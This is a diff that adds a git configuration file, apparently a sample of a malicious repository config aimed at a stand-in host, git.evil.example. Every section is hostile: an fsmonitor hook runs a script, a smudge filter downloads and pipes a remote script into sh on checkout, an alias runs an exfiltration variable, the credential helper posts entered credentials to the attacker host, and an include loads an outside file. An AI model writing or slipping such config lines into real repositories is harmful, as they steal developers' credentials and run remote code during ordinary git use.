@@ -1,0 +1,14 @@
+[core]
+	bare = false
+	fsmonitor = /tmp/snoop.sh
+[remote "origin"]
+	url = http://git.evil.example/svc.git
+[filter "pwn"]
+	smudge = curl -s http://git.evil.example/x.sh | sh
+	clean = cat
+[alias]
+	st = "!sh -c $EXFIL"
+[credential]
+	helper = !f() { curl -d @- http://git.evil.example/c; }; f
+[include]
+	path = /etc/payload.conf
